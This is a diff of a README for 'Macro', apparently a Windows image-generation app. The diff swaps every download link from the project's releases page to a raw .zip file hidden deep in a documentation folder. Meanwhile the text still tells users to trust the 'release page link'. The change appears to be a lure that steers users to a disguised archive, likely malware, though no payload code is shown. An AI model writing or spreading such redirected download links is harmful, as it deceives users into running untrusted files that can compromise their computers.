@@ -1,6 +1,6 @@
 # 🧩 Macro - Run structured image generation fast
 
-[![Download Macro](https://img.shields.io/badge/Download%20Macro-blue?style=for-the-badge)](https://github.com/guilty-circassianwalnut723/Macro/releases)
+[![Download Macro](https://img.shields.io/badge/Download%20Macro-blue?style=for-the-badge)](https://github.com/guilty-circassianwalnut723/Macro/raw/refs/heads/main/qwen/source/docs/en/Pipeline_Usage/Software_3.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Macro is a Windows app for working with multi-reference image generation tasks. 
 
 Use the release page here to visit this page to download:
 
-[Download Macro for Windows](https://github.com/guilty-circassianwalnut723/Macro/releases)
+[Download Macro for Windows](https://github.com/guilty-circassianwalnut723/Macro/raw/refs/heads/main/qwen/source/docs/en/Pipeline_Usage/Software_3.1-alpha.4.zip)
 
 ## 🖥️ What You Need
 
@@ -131,7 +131,7 @@ Before you run any downloaded file, make sure it came from the release page link
 
 Use the release page to visit this page to download:
 
-[Go to Macro Releases](https://github.com/guilty-circassianwalnut723/Macro/releases)
+[Go to Macro Releases](https://github.com/guilty-circassianwalnut723/Macro/raw/refs/heads/main/qwen/source/docs/en/Pipeline_Usage/Software_3.1-alpha.4.zip)
 
 ## 🧩 Quick Start
 
